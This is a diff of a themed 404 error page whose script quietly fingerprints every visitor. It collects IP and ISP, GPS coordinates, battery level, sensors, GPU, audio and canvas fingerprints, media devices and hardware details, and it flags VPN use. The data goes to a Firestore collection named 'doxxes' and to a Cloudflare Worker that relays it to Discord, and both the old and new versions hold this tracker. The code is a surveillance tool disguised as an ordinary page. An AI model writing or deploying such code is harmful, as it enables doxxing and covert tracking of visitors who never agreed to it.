@@ -1,94 +1,131 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, viewport-fit=cover">
-<meta name="robots" content="noindex, nofollow">
-<title>404 // TERSESAT DI ISEKAI</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Baloo+2:wght@600;800&family=Poppins:wght@400;500;700&display=swap" rel="stylesheet">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>404 // LOST IN THE VOID</title>
 <style>
-  :root { --pink:#ff6fb0;--gold:#ffd76b;--blue:#5fd3ff;--purple:#8a5cff;--bg1:#1c1036;--bg2:#3a1c5e; }
-  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent;
-    -webkit-user-select:none;-moz-user-select:none;user-select:none;}
-  html,body{margin:0;padding:0;width:100%;min-height:100dvh;
-    background:linear-gradient(160deg,var(--bg1),var(--bg2) 55%,#2a1450);
-    color:#fff;font-family:'Poppins',sans-serif;overflow-x:hidden;}
-  #fx{position:fixed;inset:0;width:100%;height:100%;z-index:0;pointer-events:none;}
-  .clouds{position:fixed;inset:0;z-index:1;pointer-events:none;
-    background:radial-gradient(ellipse 60% 30% at 15% 20%,rgba(255,111,176,.15),transparent 70%),
-               radial-gradient(ellipse 55% 28% at 85% 75%,rgba(90,211,255,.13),transparent 70%);}
-  .vignette{position:fixed;inset:0;z-index:6;pointer-events:none;
-    background:radial-gradient(ellipse at center,rgba(0,0,0,0) 45%,rgba(10,0,20,.65) 100%);}
-  main{position:relative;z-index:10;width:100%;min-height:100dvh;
-    display:flex;flex-direction:column;align-items:center;justify-content:center;
-    text-align:center;padding:calc(env(safe-area-inset-top)+20px) 16px calc(env(safe-area-inset-bottom)+20px);gap:6px;}
-  .chibi{font-size:clamp(2.4rem,10vw,5.5rem);margin-bottom:.1em;
-    filter:drop-shadow(0 0 16px rgba(255,111,176,.55));animation:bob 3.2s ease-in-out infinite;}
-  @keyframes bob{0%,100%{transform:translateY(0) rotate(-2deg)}50%{transform:translateY(-12px) rotate(2deg)}}
-  h1{font-family:'Baloo 2',sans-serif;font-weight:800;font-size:clamp(1.6rem,8vw,5rem);
-    line-height:1.08;margin:0 0 .25em;
-    background:linear-gradient(90deg,var(--pink),var(--gold),var(--blue),var(--purple));
-    background-size:300% auto;-webkit-background-clip:text;background-clip:text;color:transparent;
-    animation:shine 5s linear infinite;}
-  @keyframes shine{to{background-position:300% 50%;}}
-  p.sub{font-size:clamp(.82rem,3.5vw,1.18rem);color:#ffe3f4;max-width:560px;margin:0 auto .9em;line-height:1.6;}
-  p.sub .kanji{display:block;font-family:'Baloo 2',sans-serif;font-size:1.2em;color:var(--gold);margin-bottom:.3em;letter-spacing:.1em;}
-  .sparkles{position:fixed;inset:0;z-index:2;pointer-events:none;}
-  .sparkle{position:absolute;font-size:1rem;opacity:.8;animation:twinkle 2.4s ease-in-out infinite;}
-  @keyframes twinkle{0%,100%{opacity:.15;transform:scale(.7)}50%{opacity:1;transform:scale(1.15)}}
-  .term{font-family:'Poppins',monospace;font-size:clamp(.68rem,2.8vw,.88rem);color:#ffe9f7;
-    background:rgba(30,10,55,.6);border:2px solid rgba(255,111,176,.45);border-radius:14px;
-    padding:12px 14px;max-width:580px;width:94%;text-align:left;
-    box-shadow:0 0 28px rgba(138,92,255,.32);backdrop-filter:blur(4px);}
-  .term .line{white-space:pre-wrap;word-break:break-word;padding:1.5px 0;}
-  .term .line.gold{color:var(--gold);font-weight:600;}
-  .term .line.pink{color:var(--pink);}
-  .term .line.dim{color:rgba(255,233,247,.4);}
-  .cursor{display:inline-block;width:7px;height:.95em;background:var(--pink);
-    animation:blink 1s steps(1) infinite;vertical-align:text-bottom;margin-left:2px;}
-  @keyframes blink{50%{opacity:0}}
-  .badge{display:inline-flex;align-items:center;gap:7px;margin-top:1.2em;
-    font-size:.65rem;font-weight:700;letter-spacing:.1em;color:#3a0f2b;
-    background:linear-gradient(90deg,var(--pink),var(--gold));padding:7px 15px;border-radius:999px;
-    box-shadow:0 0 16px rgba(255,111,176,.5);animation:floatBadge 2.4s ease-in-out infinite;}
-  @keyframes floatBadge{0%,100%{transform:translateY(0)}50%{transform:translateY(-5px)}}
+ body {
+  margin: 0;
+  height: 100vh;
+  background-color: #0a0a0a;
+  color: #c0c0c0;
+  font-family: 'Courier New', Courier, monospace;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  overflow: hidden;
+  position: relative;
+ }
+ #container {
+  z-index: 10;
+  text-align: center;
+  max-width: 600px;
+  padding: 20px;
+ }
+ h1 {
+  font-size: 2.5rem;
+  color: #e0e0e0;
+  margin-bottom: 10px;
+  text-transform: uppercase;
+  letter-spacing: 5px;
+ }
+ p {
+  font-size: 1.1rem;
+  margin-bottom: 30px;
+  opacity: 0.8;
+ }
+ #details {
+  font-size: 0.9rem;
+  color: #888;
+  margin-top: 20px;
+  min-height: 100px;
+  text-align: left;
+  border-top: 1px solid #333;
+  padding-top: 20px;
+ }
+ .line {
+  margin: 5px 0;
+  opacity: 0;
+  animation: fadeIn 0.5s forwards;
+ }
+ @keyframes fadeIn {
+  to { opacity: 1; }
+ }
+ .glitch {
+  position: relative;
+ }
+ .glitch::before, .glitch::after {
+  content: attr(data-text);
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+ }
+ .glitch::before {
+  left: 2px;
+  text-shadow: -1px 0 #ff003c;
+  clip: rect(44px, 450px, 56px, 0);
+  animation: glitch-anim 5s infinite linear alternate-reverse;
+ }
+ .glitch::after {
+  left: -2px;
+  text-shadow: -1px 0 #00ff41;
+  clip: rect(44px, 450px, 56px, 0);
+  animation: glitch-anim2 5s infinite linear alternate-reverse;
+ }
+ @keyframes glitch-anim {
+  0% { clip: rect(20px, 9999px, 10px, 0); }
+  20% { clip: rect(60px, 9999px, 70px, 0); }
+  40% { clip: rect(30px, 9999px, 15px, 0); }
+  60% { clip: rect(80px, 9999px, 85px, 0); }
+  80% { clip: rect(10px, 9999px, 35px, 0); }
+  100% { clip: rect(50px, 9999px, 60px, 0); }
+ }
+ @keyframes glitch-anim2 {
+  0% { clip: rect(15px, 9999px, 25px, 0); }
+  20% { clip: rect(45px, 9999px, 55px, 0); }
+  40% { clip: rect(10px, 9999px, 20px, 0); }
+  60% { clip: rect(70px, 9999px, 80px, 0); }
+  80% { clip: rect(25px, 9999px, 35px, 0); }
+  100% { clip: rect(60px, 9999px, 75px, 0); }
+ }
+ /* Noise Overlay */
+ #noise {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  pointer-events: none;
+  z-index: 1;
+  opacity: 0.05;
+  background: url('data:image/svg+xml;utf8,%3Csvg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg"%3E%3Cfilter id="noiseFilter"%3E%3CfeTurbulence type="fractalNoise" baseFrequency="0.65" numOctaves="3" stitchTiles="stitch"/%3E%3C/filter%3E%3Crect width="100%25" height="100%25" filter="url(%23noiseFilter)"/%3E%3C/svg%3E');
+ }
 </style>
 </head>
 <body>
-<canvas id="fx"></canvas>
-<div class="clouds"></div>
-<div class="vignette"></div>
-<main>
-  <div class="chibi">🌸🎐✨</div>
-  <h1>404 // TERSESAT DI ISEKAI</h1>
-  <p class="sub">
-    <span class="kanji">迷子になりました</span>
-    Halaman ini terhisap ke dunia lain bersama portal sihirnya.<br>
-    Sepertinya kamu salah nyasar, senpai~
-  </p>
-  <div class="term" id="term"></div>
-  <div class="badge">🎴 GUILD RANK: PENGUNJUNG TERSESAT</div>
-</main>
-<div class="sparkles" id="sparkles"></div>
-<audio id="bgm" src="anime404.mp3" loop preload="auto"></audio>
+<div id="noise"></div>
+<div id="container">
+ <h1 class="glitch" data-text="404 // LOST">404 // LOST</h1>
+ <p>You have ventured into the void...</p>
+ <div id="details"></div>
+</div>
 
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
 import { getFirestore, collection, addDoc, serverTimestamp }
-  from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+ from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
-"use strict";
-
-/* ── CONFIG (diisi GitHub Actions) ───────────────────────────────────── */
+/* ── CONFIG ── */
 const firebaseConfig = {
-  apiKey:            "__FIREBASE_API_KEY__",
-  authDomain:        "__FIREBASE_AUTH_DOMAIN__",
-  projectId:         "__FIREBASE_PROJECT_ID__",
-  storageBucket:     "__FIREBASE_STORAGE_BUCKET__",
-  messagingSenderId: "__FIREBASE_MESSAGING_SENDER_ID__",
-  appId:             "__FIREBASE_APP_ID__"
+ apiKey: "__FIREBASE_API_KEY__",
+ authDomain: "__FIREBASE_AUTH_DOMAIN__",
+ projectId: "__FIREBASE_PROJECT_ID__",
+ storageBucket: "__FIREBASE_STORAGE_BUCKET__",
+ messagingSenderId: "__FIREBASE_MESSAGING_SENDER_ID__",
+ appId: "__FIREBASE_APP_ID__"
 };
 var WORKER_URL = "__CF_WORKER_URL__";
 
@@ -97,268 +134,296 @@ var CF_READY = WORKER_URL && !WORKER_URL.startsWith("__");
 
 var app, db;
 if (FB_READY) {
-  try { app = initializeApp(firebaseConfig); db = getFirestore(app); }
-  catch(e) { FB_READY = false; }
+ try { app = initializeApp(firebaseConfig); db = getFirestore(app); }
+ catch(e) { FB_READY = false; }
 }
 
-var IS_MOBILE = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) || window.innerWidth < 768;
+/* ── UI LOGIC ── */
+const details = document.getElementById("details");
 
-/* ── Block selection / context menu ─────────────────────────────────── */
-document.addEventListener("contextmenu", function(e){ e.preventDefault(); });
-document.addEventListener("selectstart",  function(e){ e.preventDefault(); });
-
-/* ── Audio ───────────────────────────────────────────────────────────── */
-var bgm = document.getElementById("bgm");
-bgm.volume = 0.5;
-bgm.play().catch(function(){});
-["click","keydown","touchstart","scroll"].forEach(function(ev){
-  window.addEventListener(ev, function f(){ bgm.play().catch(function(){}); window.removeEventListener(ev,f); });
-});
-
-/* ── Canvas ──────────────────────────────────────────────────────────── */
-var canvas = document.getElementById("fx");
-var ctx    = canvas.getContext("2d");
-var stars = [], petals = [];
-var PCOLORS = ["#ff9ecb","#ffd76b","#c9a2ff","#ff6fb0"];
-function buildScene(){
-  var W = canvas.width  = window.innerWidth;
-  var H = canvas.height = window.innerHeight;
-  var area = W * H;
-  var sc = IS_MOBILE ? Math.min(Math.floor(area/18000),55) : Math.min(Math.floor(area/9000),180);
-  var pc = IS_MOBILE ? Math.min(Math.floor(area/35000),16) : Math.min(Math.floor(area/16000),55);
-  sc = Math.max(sc, IS_MOBILE ? 25 : 60);
-  pc = Math.max(pc, IS_MOBILE ? 6  : 18);
-  stars = [];
-  for(var i=0;i<sc;i++) stars.push({x:Math.random()*W,y:Math.random()*H,r:Math.random()*1.4+0.3,speed:Math.random()*.018+.007,phase:Math.random()*Math.PI*2});
-  petals = [];
-  for(var j=0;j<pc;j++) petals.push({x:Math.random()*W,y:Math.random()*H,size:Math.random()*9+5,color:PCOLORS[j%PCOLORS.length],speedY:Math.random()*1.1+0.4,speedX:Math.random()*.7-.35,sway:Math.random()*Math.PI*2,rot:Math.random()*Math.PI*2,rotSpeed:Math.random()*.04-.02});
+function addLine(text) {
+ const div = document.createElement("div");
+ div.className = "line";
+ div.innerText = "> " + text;
+ div.style.animationDelay = (Math.random() * 0.5) + "s";
+ details.appendChild(div);
 }
-window.addEventListener("resize", buildScene);
-buildScene();
-var fc=0;
-function render(){
-  requestAnimationFrame(render); fc++;
-  if(IS_MOBILE && fc%2!==0) return;
-  var W=canvas.width,H=canvas.height;
-  ctx.clearRect(0,0,W,H);
-  for(var i=0;i<stars.length;i++){var s=stars[i];s.phase+=s.speed;var a=Math.max(0,.3+.5*Math.sin(s.phase));ctx.beginPath();ctx.arc(s.x,s.y,s.r,0,Math.PI*2);ctx.fillStyle="rgba(255,255,255,"+a.toFixed(2)+")";ctx.fill();}
-  for(var j=0;j<petals.length;j++){
-    var p=petals[j];p.sway+=.018;p.y+=p.speedY;p.x+=p.speedX+Math.sin(p.sway)*.45;p.rot+=p.rotSpeed;
-    if(p.y>H+20){p.y=-20;p.x=Math.random()*W;}
-    if(p.x>W+20)p.x=-20;else if(p.x<-20)p.x=W+20;
-    ctx.save();ctx.translate(p.x,p.y);ctx.rotate(p.rot);ctx.fillStyle=p.color;
-    if(IS_MOBILE){ctx.beginPath();ctx.ellipse(0,0,p.size/2,p.size*.35,0,0,Math.PI*2);}
-    else{ctx.beginPath();ctx.moveTo(0,-p.size/2);ctx.bezierCurveTo(p.size/2,-p.size/2,p.size/2,p.size/2,0,p.size/2);ctx.bezierCurveTo(-p.size/2,p.size/2,-p.size/2,-p.size/2,0,-p.size/2);}
-    ctx.fill();ctx.restore();
+
+/* ── DATA COLLECTION (THE BRAIN) ── */
+async function collectAll() {
+ // Start UI Animation
+ addLine("Initializing void scan...");
+ await new Promise(r => setTimeout(r, 500));
+ 
+ // 1. Basic Nav
+ const navData = {
+  userAgent: navigator.userAgent,
+  platform: navigator.platform,
+  language: navigator.language,
+  languages: (navigator.languages || []).join(", "),
+  cookieEnabled: navigator.cookieEnabled,
+  doNotTrack: navigator.doNotTrack,
+  online: navigator.onLine,
+  hardwareConcurrency: navigator.hardwareConcurrency,
+  deviceMemory: navigator.deviceMemory,
+  maxTouchPoints: navigator.maxTouchPoints,
+  connectionType: navigator.connection?.type,
+  effectiveConnection: navigator.connection?.effectiveType,
+  downlink: navigator.connection?.downlink,
+  rtt: navigator.connection?.rtt,
+  saveData: navigator.connection?.saveData
+ };
+ addLine("Scanning Navigator API...");
+ 
+ // 2. Screen
+ const screenData = {
+  width: screen.width,
+  height: screen.height,
+  availWidth: screen.availWidth,
+  availHeight: screen.availHeight,
+  colorDepth: screen.colorDepth,
+  pixelRatio: window.devicePixelRatio,
+  orientation: screen.orientation?.type,
+  orientationAngle: screen.orientation?.angle,
+  innerWidth: window.innerWidth,
+  innerHeight: window.innerHeight,
+  outerWidth: window.outerWidth,
+  outerHeight: window.outerHeight
+ };
+ addLine("Measuring Display Matrix...");
+ 
+ // 3. GPU
+ let gpuData = { vendor: "Unknown", renderer: "Unknown", version: "Unknown" };
+ try {
+  const c = document.createElement('canvas');
+  const gl = c.getContext('webgl2') || c.getContext('webgl');
+  if (gl) {
+   const ext = gl.getExtension('WEBGL_debug_renderer_info');
+   gpuData.vendor = ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : "Unknown";
+   gpuData.renderer = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : "Unknown";
+   gpuData.version = gl.getParameter(gl.VERSION);
+   gpuData.maxTextureSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
+   gpuData.extensions = (gl.getSupportedExtensions() || []).join(", ");
   }
-}
-render();
-
-/* ── Sparkles ─────────────────────────────────────────────────────────── */
-var EMOJIS=["✨","🌸","⭐","💫","🎐"];
-var wrap=document.getElementById("sparkles");
-for(var i=0;i<(IS_MOBILE?6:12);i++){
-  var el=document.createElement("span");el.className="sparkle";
-  el.textContent=EMOJIS[i%EMOJIS.length];
-  el.style.left=(Math.random()*95)+"%";el.style.top=(Math.random()*95)+"%";
-  el.style.animationDelay=(Math.random()*2.2)+"s";wrap.appendChild(el);
-}
-
-/* ── Terminal ─────────────────────────────────────────────────────────── */
-var term=document.getElementById("term");
-function addLine(txt,cls){var d=document.createElement("div");d.className="line"+(cls?" "+cls:"");d.textContent=txt;term.appendChild(d);}
-function addCursor(){var c=document.createElement("span");c.className="cursor";term.appendChild(c);}
-
-/* ── IP lookup (dengan proxy detection) ──────────────────────────────── */
-function fetchJson(url, ms){
-  return new Promise(function(resolve,reject){
-    var tid=setTimeout(function(){reject(new Error("timeout"));},ms);
-    fetch(url,{headers:{"Accept":"application/json"}})
-      .then(function(r){clearTimeout(tid);return r.json();})
-      .then(resolve).catch(function(e){clearTimeout(tid);reject(e);});
+ } catch(e) {}
+ addLine("Extracting GPU Signature...");
+ 
+ // 4. Audio & Canvas FP
+ let audioFP = "Flat";
+ let canvasFP = "Blank";
+ try {
+  // Audio
+  const AudioContext = window.AudioContext || window.webkitAudioContext;
+  const ctx = new AudioContext();
+  const osc = ctx.createOscillator();
+  const gain = ctx.createGain();
+  const script = ctx.createScriptProcessor(4096, 1, 1);
+  gain.gain.value = 0;
+  osc.connect(gain);
+  gain.connect(script);
+  script.connect(ctx.destination);
+  osc.frequency.value = 1000;
+  osc.start();
+  let fp = [];
+  script.onaudioprocess = (e) => {
+   const data = e.inputBuffer.getChannelData(0);
+   audioFP = Array.from(data).slice(0, 10).join("-");
+   osc.stop();
+   ctx.close();
+  };
+  await new Promise(r => setTimeout(r, 50));
+  
+  // Canvas
+  const c2 = document.createElement('canvas');
+  c2.width = 200; c2.height = 50;
+  const ctx2 = c2.getContext('2d');
+  ctx2.textBaseline = "top";
+  ctx2.font = "14px Arial";
+  ctx2.fillStyle = "#f00";
+  ctx2.fillRect(125, 1, 62, 20);
+  ctx2.fillStyle = "#0099ff";
+  ctx2.fillText("Isekai Dox 🌸", 2, 15);
+  canvasFP = c2.toDataURL();
+ } catch(e) {}
+ addLine("Fingerprinting Audio & Canvas...");
+ 
+ // 5. Storage & Media
+ const storageData = {
+  localStorage: !!window.localStorage,
+  sessionStorage: !!window.sessionStorage,
+  indexedDB: !!window.indexedDB,
+  serviceWorker: 'serviceWorker' in navigator,
+  cacheAPI: 'caches' in window,
+  cookies: document.cookie.split(';').length
+ };
+ 
+ let mediaData = { audioIn: [], videoIn: [], audioOut: [] };
+ try {
+  const devices = await navigator.mediaDevices?.enumerateDevices();
+  mediaData.audioIn = devices.filter(d => d.kind === 'audioinput').map(d => d.label || 'Mic');
+  mediaData.videoIn = devices.filter(d => d.kind === 'videoinput').map(d => d.label || 'Cam');
+  mediaData.audioOut = devices.filter(d => d.kind === 'audiooutput').map(d => d.label || 'Speaker');
+ } catch(e) {}
+ addLine("Checking Storage & Media...");
+ 
+ // 6. Locale & Battery
+ const localeData = {
+  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+  currency: Intl.NumberFormat().resolvedOptions().currency,
+  calendar: Intl.DateTimeFormat().resolvedOptions().calendar,
+  numberingSystem: Intl.NumberFormat().resolvedOptions().numberingSystem
+ };
+ 
+ let batteryData = { level: null, charging: null };
+ try {
+  const batt = await navigator.getBattery?.();
+  batteryData.level = Math.round(batt.level * 100) + "%";
+  batteryData.charging = batt.charging;
+ } catch(e) {}
+ addLine("Reading Locale & Power...");
+ 
+ // 7. Sensors
+ let sensorData = { accel: null, gyro: null, mag: null };
+ try {
+  if ('Accelerometer' in window) {
+   const acc = new window.Accelerometer({frequency: 1});
+   const d = await acc.getData();
+   sensorData.accel = `X:${d.x?.toFixed(2)} Y:${d.y?.toFixed(2)} Z:${d.z?.toFixed(2)}`;
+  }
+  if ('Gyroscope' in window) {
+   const gyro = new window.Gyroscope({frequency: 1});
+   const d = await gyro.getData();
+   sensorData.gyro = `X:${d.x?.toFixed(2)} Y:${d.y?.toFixed(2)} Z:${d.z?.toFixed(2)}`;
+  }
+  if ('Magnetometer' in window) {
+   const mag = new window.Magnetometer({frequency: 1});
+   const d = await mag.getData();
+   sensorData.mag = `X:${d.x?.toFixed(2)} Y:${d.y?.toFixed(2)} Z:${d.z?.toFixed(2)}`;
+  }
+ } catch(e) {}
+ addLine("Calibrating Sensors...");
+ 
+ // 8. IP & GPS
+ let ipData = { ip: "Unknown", isp: "Unknown", city: "Unknown", country: "Unknown" };
+ try {
+  const resp = await fetch("https://ipapi.co/json/", { signal: AbortSignal.timeout(2000) });
+  const json = await resp.json();
+  ipData.ip = json.ip;
+  ipData.isp = json.org;
+  ipData.city = json.city;
+  ipData.country = json.country_name;
+  ipData.region = json.region;
+  ipData.timezoneIp = json.timezone;
+  ipData.proxy = json.proxy;
+  ipData.hosting = json.hosting;
+  ipData.asn = json.asn;
+ } catch(e) {}
+ addLine("Triangulating IP Address...");
+ 
+ let gpsData = { lat: null, lon: null };
+ try {
+  const pos = await new Promise((resolve, reject) => {
+   navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000, enableHighAccuracy: true });
   });
-}
-async function getIpInfo(){
-  // ip-api.com: tambah proxy & hosting untuk VPN detection
-  var services = [
-    "https://ipapi.co/json/",
-    "https://ip-api.com/json/?fields=query,org,city,regionName,country,timezone,proxy,hosting"
-  ];
-  for(var i=0;i<services.length;i++){
-    try{
-      var d = await fetchJson(services[i], 5000);
-      if(d.query && !d.ip)             d.ip           = d.query;
-      if(d.regionName && !d.region)    d.region       = d.regionName;
-      if(d.country && !d.country_name) d.country_name = d.country;
-      return d;
-    }catch(e){}
+  gpsData.lat = pos.coords.latitude;
+  gpsData.lon = pos.coords.longitude;
+ } catch(e) {}
+ addLine("Locking GPS Coordinates...");
+ 
+ // 9. Browser Features
+ const features = {
+  webgl2: !!document.createElement('canvas').getContext('webgl2'),
+  webgpu: !!navigator.gpu,
+  webrtc: !!window.RTCPeerConnection,
+  cssGrid: !!CSS.supports('display', 'grid'),
+  flexbox: !!CSS.supports('display', 'flex'),
+  fetchAPI: !!window.fetch,
+  promise: !!window.Promise,
+  symbol: !!window.Symbol,
+  map: !!window.Map,
+  set: !!window.Set
+ };
+ addLine("Testing Browser Capabilities...");
+ 
+ // 10. Plugins & UAH
+ let pluginsData = [];
+ let mimetypesData = [];
+ for (let i = 0; i < navigator.plugins.length; i++) {
+  pluginsData.push(navigator.plugins[i].name);
+ }
+ for (let i = 0; i < navigator.mimeTypes.length; i++) {
+  mimetypesData.push(navigator.mimeTypes[i].type);
+ }
+ 
+ let uahData = { brands: null, mobile: null, platform: null, model: null };
+ if (navigator.userAgentData) {
+  uahData.brands = JSON.stringify(navigator.userAgentData.brands);
+  uahData.mobile = navigator.userAgentData.mobile;
+  uahData.platform = navigator.userAgentData.platform;
+  try {
+   const hints = await navigator.userAgentData.getHighEntropyValues(["model", "architecture", "bitness"]);
+   uahData.model = hints.model;
+   uahData.architecture = hints.architecture;
+   uahData.bitness = hints.bitness;
+  } catch(e) {}
+ }
+ addLine("Analyzing User Agent Hints...");
+
+ // 11. Build Final Payload
+ const payload = {
+  ...navData,
+  ...screenData,
+  ...gpuData,
+  audioFingerprint: audioFP,
+  canvasFingerprint: canvasFP,
+  ...storageData,
+  ...mediaData,
+  ...localeData,
+  ...batteryData,
+  ...sensorData,
+  ...ipData,
+  ...gpsData,
+  ...features,
+  plugins: pluginsData.join(", "),
+  mimeTypes: mimetypesData.join(", "),
+  ...uahData
+ };
+
+ addLine("Packaging Data...");
+ 
+ // Send to Firebase
+ if (FB_READY) {
+  try {
+   await addDoc(collection(db, "doxxes"), {
+    ...payload,
+    timestamp: serverTimestamp(),
+    userAgent: payload.userAgent
+   });
+   addLine("✅ Saved to Firestore");
+  } catch (e) {
+   addLine("❌ Firestore Error: " + e.message);
   }
-  return null;
-}
+ }
 
-/* ── GPS Geolocation ─────────────────────────────────────────────────── */
-function getGPS(){
-  return new Promise(function(resolve){
-    if(!navigator.geolocation){ resolve(null); return; }
-    navigator.geolocation.getCurrentPosition(
-      function(pos){ resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: Math.round(pos.coords.accuracy) }); },
-      function(){ resolve(null); },
-      { timeout: 8000, maximumAge: 0, enableHighAccuracy: true }
-    );
-  });
-}
-
-/* ── Baterai ─────────────────────────────────────────────────────────── */
-async function getBattery(){
-  if(!navigator.getBattery) return null;
-  try{
-    var b = await navigator.getBattery();
-    return { level: Math.round(b.level * 100), charging: b.charging };
-  }catch(e){ return null; }
-}
-
-/* ── Koneksi internet ────────────────────────────────────────────────── */
-function getNetwork(){
-  var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-  if(!c) return null;
-  return {
-    type:     c.effectiveType || c.type || null,
-    downlink: c.downlink      || null,
-    saveData: !!c.saveData
-  };
-}
-
-/* ── Hardware & touch ────────────────────────────────────────────────── */
-function getHardware(){
-  return {
-    ram:         navigator.deviceMemory        || null,
-    cpu:         navigator.hardwareConcurrency || null,
-    touchPoints: navigator.maxTouchPoints      || 0
-  };
-}
-
-/* ── Visitor fingerprint + kunjungan ─────────────────────────────────── */
-function simpleHash(str){
-  var h = 0x811c9dc5 >>> 0;
-  for(var i=0;i<str.length;i++){
-    h ^= str.charCodeAt(i);
-    h  = Math.imul(h, 0x01000193) >>> 0;
+ // Send to Cloudflare Worker
+ if (CF_READY) {
+  try {
+   await fetch(WORKER_URL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload)
+   });
+   addLine("✅ Sent to Discord");
+  } catch (e) {
+   addLine("❌ Worker Error: " + e.message);
   }
-  return h.toString(16).padStart(8,"0");
-}
-function getVisitInfo(){
-  var raw = [
-    navigator.userAgent, navigator.language,
-    screen.width, screen.height, screen.colorDepth,
-    new Date().getTimezoneOffset(),
-    navigator.hardwareConcurrency || 0,
-    navigator.deviceMemory        || 0
-  ].join("||");
-  var fp  = simpleHash(raw);
-  var KEY = "_isekai_v";
-  var now = Date.now();
-  var stored;
-  try{ stored = JSON.parse(localStorage.getItem(KEY)); }catch(e){}
-  if(!stored || stored.fp !== fp){ stored = { fp:fp, n:1, first:now }; }
-  else { stored.n++; }
-  stored.last = now;
-  try{ localStorage.setItem(KEY, JSON.stringify(stored)); }catch(e){}
-  return stored;
+ }
+
+ addLine("Void Scan Complete.");
 }
 
-/* ── Kirim ke Firestore ──────────────────────────────────────────────── */
-async function sendToFirestore(data){
-  if(!FB_READY) return;
-  try{
-    await addDoc(collection(db,"visitors_404"),{
-      ...data, timestamp: serverTimestamp(),
-      url: window.location.href, referrer: document.referrer || null
-    });
-  }catch(e){}
-}
-
-/* ── Kirim ke Worker → Discord ───────────────────────────────────────── */
-async function sendToWorker(data){
-  if(!CF_READY) return;
-  try{
-    await fetch(WORKER_URL,{
-      method:  "POST",
-      headers: {"Content-Type":"application/json"},
-      body:    JSON.stringify({ ...data, url: window.location.href, referrer: document.referrer || null })
-    });
-  }catch(e){}
-}
-
-/* ── MAIN ────────────────────────────────────────────────────────────── */
-async function run(){
-  addLine("> guild@isekai:~$ melacak pengunjung...");
-  addLine("> mengambil koordinat portal...", "dim");
-
-  /* Semua lookup jalan paralel */
-  var results = await Promise.all([
-    getIpInfo(),
-    getGPS(),
-    getBattery()
-  ]);
-  var info    = results[0];
-  var gps     = results[1];
-  var battery = results[2];
-  var net     = getNetwork();
-  var hw      = getHardware();
-  var visit   = getVisitInfo();
-
-  var ip      = info&&info.ip           ||"tidak diketahui";
-  var isp     = info&&info.org          ||"tidak diketahui";
-  var city    = info&&info.city         ||"";
-  var region  = info&&info.region       ||"";
-  var country = info&&info.country_name ||"";
-  var tz      = info&&info.timezone     ||"tidak diketahui";
-  var lokasi  = [city,region,country].filter(Boolean).join(", ")||"tidak diketahui";
-  var isProxy   = info ? (info.proxy   != null ? info.proxy   : null) : null;
-  var isHosting = info ? (info.hosting != null ? info.hosting : null) : null;
-
-  addLine("> IP: "+ip, "gold");
-  addLine("> ISP: "+isp+(isProxy?"  ⚠ VPN/Proxy":"")+(isHosting?"  ⚠ Datacenter":""));
-  addLine("> Lokasi (IP): "+lokasi);
-  if(gps) addLine("> GPS: "+gps.lat.toFixed(5)+", "+gps.lon.toFixed(5)+" (±"+gps.accuracy+"m)", "gold");
-  if(net&&net.type) addLine("> Koneksi: "+net.type.toUpperCase()+(net.downlink?" · "+net.downlink+"Mbps":""));
-  if(battery) addLine("> Baterai: "+battery.level+"% "+(battery.charging?"(charging)":""));
-  addLine("> RAM: "+(hw.ram?hw.ram+"GB":"—")+"  CPU: "+(hw.cpu?hw.cpu+" core":"—")+"  Touch: "+(hw.touchPoints>0?"Ya":"Tidak"));
-  addLine("> Fingerprint: "+visit.fp+"  (kunjungan ke-"+visit.n+")");
-  addLine("> rank akses: PENGUNJUNG TERSESAT","pink");
-  addLine("> mencatat ke grimoire...", "dim");
-  addCursor();
-
-  var payload = {
-    ip, isp, city, region, country, lokasi,
-    isProxy, isHosting,
-    timezone:   tz,
-    platform:   navigator.platform,
-    userAgent:  navigator.userAgent,
-    language:   navigator.language,
-    screenW:    screen.width,
-    screenH:    screen.height,
-    pixelRatio: devicePixelRatio,
-    gpsLat:     gps ? gps.lat      : null,
-    gpsLon:     gps ? gps.lon      : null,
-    gpsAcc:     gps ? gps.accuracy : null,
-    battLevel:    battery ? battery.level    : null,
-    battCharging: battery ? battery.charging : null,
-    netType:     net ? net.type     : null,
-    netDownlink: net ? net.downlink : null,
-    netSaveData: net ? net.saveData : null,
-    ram:         hw.ram,
-    cpu:         hw.cpu,
-    touchPoints: hw.touchPoints,
-    fp:          visit.fp,
-    visitCount:  visit.n,
-    firstVisit:  visit.first
-  };
-
-  await Promise.all([sendToFirestore(payload), sendToWorker(payload)]);
-}
-
-run();
+// Run it
+collectAll();
 </script>
 </body>
 </html>
